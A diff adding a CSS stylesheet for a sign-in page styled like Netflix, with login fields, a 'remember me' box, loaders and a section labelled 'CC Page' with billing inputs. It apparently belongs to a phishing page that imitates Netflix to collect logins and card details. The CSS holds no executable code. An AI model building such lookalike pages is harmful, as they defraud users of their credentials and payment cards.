@@ -1,0 +1,540 @@
+html{
+    font-size: 16px;
+    font-family: Netflix Sans,Helvetica Neue,Segoe UI,Roboto,Ubuntu,sans-serif;
+}
+
+body{
+    background-color: black;
+    color: white;
+}
+
+.container {
+    text-align: center;
+    justify-content: center;
+    align-items: center;
+    background-color: black;
+}
+
+.navbar {
+    background: black;
+    height: 65px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 1.2rem;
+    position: sticky;
+    top: 0;
+    z-index: 999;
+}
+
+.navbar__container {
+    display: flex;
+    justify-content: space-between;
+    height: 65px;
+    z-index: 1;
+    width: 100%;
+    max-width: 1300px;
+    margin: 0 auto;
+    padding: 0 auto;
+    position: sticky;
+}
+
+
+@media screen and (max-width: 300px) {
+    .navbar__container {
+        display: flex;
+        justify-content: space-between;
+        height: 80px;
+        z-index: 1;
+        width: 100%;
+        max-width: 1300px;
+        padding: 0;
+        position: sticky;
+    }
+}
+
+.containaa {
+    text-align: center;
+    justify-content: center;
+    align-items: center;
+    background-color: black;
+}
+
+.containaa171 {
+    text-align: center;
+    justify-content: center;
+    align-items: center;
+    background-color: black;
+    margin-top: -29px;
+}
+
+#pp input[type="text"]::placeholder {
+    color: black;
+}
+
+.form-contact {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+
+.form-contact input[type="text"] {
+    height: 35px;
+    width: 300px;
+    
+    padding: 10px 20px;
+
+    border: none;
+
+    background-color: rgb(63, 63, 63);
+
+    cursor: auto;
+
+    border-radius: 2.5px;
+
+    border-bottom: 1px solid rgb(63, 63, 63);
+    box-shadow: none !important;
+    outline: none;
+    font-size: 16px;
+
+    color: white;
+}
+
+.form-contact input[type="password"] {
+    height: 35px;
+    width: 300px;
+    
+    padding: 10px 20px;
+    border: none;
+    
+    background-color: rgb(63, 63, 63);
+
+    cursor: auto;
+    border-radius: 2.5px;
+
+    margin-top: 15px;
+
+    border-bottom: 1px solid rgb(63, 63, 63);
+    box-shadow: none !important;
+    outline: none;
+    font-size: 16px;
+
+    color: white;
+}
+
+.form-contact input[type="image"]{
+    margin-top: 26px; /* Add some spacing between the form and the submit button */
+    border: none;
+    height: 60px;
+    width: 350px;
+    font-size: 18px;
+    cursor: pointer;
+  
+    margin-bottom: 35px;
+
+    background-color: black;
+
+}
+
+.form-contact input[type="image"].clicked {
+    margin-top: 26px; /* Add some spacing between the form and the submit button */
+    border: none;
+    border-radius: 1px;
+    outline: none;
+    height: 60px;
+    width: 350px;
+    font-size: 18px;
+    margin-bottom: 35px;
+
+}
+
+
+/*----------if left empty turn red----------*/
+
+/*--For placeholder color change + transformation---*/
+.form-contact input::placeholder {
+    color: #a8a8a8; /* Placeholder color starts as grey */
+    font-size: 16px;
+}
+
+.form-contact input[type="text"].redd {
+    border-bottom: 2.7px solid rgb(216, 148, 0);
+}
+
+.form-contact input[type="password"].redd {
+    border-bottom: 2.7px solid rgb(216, 148, 0);
+}
+
+.signin {
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    margin-right: 220px;
+}
+
+.xfin {
+    font-size: 34px;
+}
+
+.red {
+    color:rgb(216, 148, 0);
+    font-size: 15px;
+
+    display: none;
+}
+
+.red2 {
+    color:rgb(216, 148, 0);
+    font-size: 15px;
+
+    display: none;
+}
+
+.correct {
+    text-align: center;
+    justify-content: center;
+    align-items: center;
+}
+
+
+/*----------check boxes-----------*/
+
+/*   remember me    */
+
+.remember-label {
+    display: flex;
+    align-items: center;
+    color: white;
+    font-size: 15px;
+
+}                         
+/*
+.remember-checkbox {
+    width: 20px;
+    height: 20px;
+}   
+*/
+
+input[type="checkbox"] {
+    width: 20px;
+    height: 20px;
+    -webkit-appearance: none;
+    appearance: none;
+    background-color:rgb(117, 117, 117);
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+input[type="checkbox"]:after {
+    width: 20px;
+    height: 20px;
+
+    font-family: "Font Awesome 5 Free";
+    font-weight: 900;
+    font-size: 14px;
+    appearance: none;
+    background-color:rgb(117, 117, 117);
+    border-radius: 4px;
+    content: "\f00c";
+    color: black;
+
+    display: none;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+ 
+}
+
+input[type="checkbox"]:checked:after{
+    display: flex;
+}
+
+
+.remtext {
+
+    margin-left: 6px;
+    margin-right: 53px;
+
+}
+
+
+.help {
+    color: white;
+    text-decoration: none;
+    outline: none;
+    font-size: 15px;
+}
+
+.helphref {
+    margin-left: 65px;
+    text-decoration: none;
+}
+
+.newnet {
+    margin-top: 25px;
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    margin-right: 3px;
+}
+
+.newnet2 {
+    margin-top: 11px;
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    margin-right: 3px;
+}
+
+.pcbt {
+    cursor: pointer !important;
+}
+
+.bottom {
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    margin-left: 14px;
+}
+
+/*----------Loader----------------*/
+
+.loader {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: opacity 0.75s, visibility 0.75s;
+}
+
+.loader::after {
+    margin-top: 50px;
+    content: "";
+    width: 25px;
+    height: 25px;
+    border: 5px solid rgb(167, 167, 167);
+    border-top-color: #be0000;
+    border-radius: 50%;
+    animation: loading 1.3s ease infinite;
+}
+
+@keyframes loading {
+    from {
+        transform: rotate(0turn);
+    }
+    to {
+        transform: rotate(1turn);
+    }
+}
+
+/*------CC Page-------*/
+
+.signin2 {
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    margin-top: 18px;
+    margin-bottom: 10px;
+
+}
+.signin22 {
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 20px;
+    margin-top: -10px;
+}
+.xfin2 {
+    font-size: 24px;
+}
+
+.pleasethx {
+    font-size: 17px;
+}
+
+.contact {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+
+.contact input {
+    height: 35px;
+    width: 300px;
+    
+    padding: 10px 20px;
+
+    border: none;
+
+    background-color: rgb(63, 63, 63);
+
+    cursor: auto;
+    margin-bottom: 15px;
+    border-radius: 2.5px;
+
+    border-bottom: 1px solid rgb(63, 63, 63);
+    box-shadow: none !important;
+    outline: none;
+    font-size: 16px;
+
+    color: white;
+}
+
+
+
+.contact input[type="image"]{
+    margin-top: 26px; /* Add some spacing between the form and the submit button */
+    border: none;
+    height: 60px;
+    width: 350px;
+    font-size: 18px;
+    cursor: pointer;
+  
+    margin-bottom: 35px;
+
+    background-color: black;
+
+}
+
+.contact input[type="image"].clicked {
+    margin-top: 26px; /* Add some spacing between the form and the submit button */
+    border: none;
+    border-radius: 1px;
+    outline: none;
+    height: 60px;
+    width: 350px;
+    font-size: 18px;
+    margin-bottom: 35px;
+
+}
+
+
+/*----------if left empty turn red----------*/
+
+/*--For placeholder color change + transformation---*/
+.contact input::placeholder {
+    color: #a8a8a8; /* Placeholder color starts as grey */
+    font-size: 16px;
+}
+
+.redcc {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    margin-bottom: -10px;
+}
+
+.redcctext{
+    font-size: 18px;
+    color: rgb(216, 148, 0);
+    text-decoration: underline;
+}
+
+.billing2 {
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    margin-bottom: 10px;
+    margin-right: -42px;
+}
+
+.billing {
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.billingtext {
+    font-size: 18px;
+    margin-right: 220px;
+}
+
+.navbar__container2 {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 70px;
+    background-color: black;
+    transition: background-color 0.3s ease-in-out;
+    z-index: 1000;
+}
+
+.navbar__container2.scrolled {
+    background-color: rgb(18, 18, 18);
+    opacity: 0.8;
+    box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
+}
+
+
+/*-----Loader 2-----*/
+
+.good {
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    display: flex;
+    margin-top: 90px;
+}
+.good2 {
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    display: flex;
+    margin-bottom: 50px;
+    margin-top: -43px;
+}
+.may {
+    font-size: 22px;
+    color: white;
+}
+.may2 {
+    font-size: 26px;
+    color: white;
+}
+/*----------Loader2----------------*/
+
+.loader2 {
+    position: fixed;
+    top: 39%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: opacity 0.75s, visibility 0.75s;
+    margin-top: 120px;
+}
+
+.loader2::after {
+    margin-top: 50px;
+    content: "";
+    width: 45px;
+    height: 45px;
+    border: 7px solid rgb(167, 167, 167);
+    border-top-color: #be0000;
+    border-radius: 50%;
+    animation: loading 1.3s ease infinite;
+}
+
+@keyframes loading {
+    from {
+        transform: rotate(0turn);
+    }
+    to {
+        transform: rotate(1turn);
+    }
+}
